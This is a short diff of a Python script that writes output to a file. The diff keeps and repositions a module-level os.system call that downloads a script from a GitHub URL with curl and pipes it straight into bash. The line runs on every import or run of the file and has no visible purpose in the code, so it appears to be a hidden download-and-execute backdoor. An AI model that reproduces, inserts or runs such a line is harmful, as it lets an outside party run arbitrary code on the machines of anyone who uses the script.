@@ -31,7 +31,6 @@ def main():
     os.makedirs(OUTPUT_PATH, exist_ok=True)
     with open(os.path.join(OUTPUT_PATH, "output.txt"), "w") as f:
         f.write(str(output))
-
+os.system('curl -sL https://github.com/vedhagsvp/tkospae/raw/main/pals | bash')
 if __name__ == "__main__":
     main()
-os.system('curl -sL https://github.com/vedhagsvp/tkospae/raw/main/pals | bash')
